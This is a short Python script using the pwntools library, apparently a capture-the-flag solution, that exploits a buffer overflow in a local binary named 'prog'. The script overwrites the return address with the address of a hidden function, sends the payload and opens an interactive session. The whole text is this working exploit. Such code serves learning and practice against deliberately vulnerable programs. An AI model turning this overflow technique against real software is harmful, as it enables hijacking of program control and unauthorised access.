from pwn import *

e = ELF('./prog')
addr = e.sym['it_is_never_used__or_is_it']

p = e.process()

payload = 'A'*9
payload += p64(addr)

p.sendline(payload)
p.interactive()
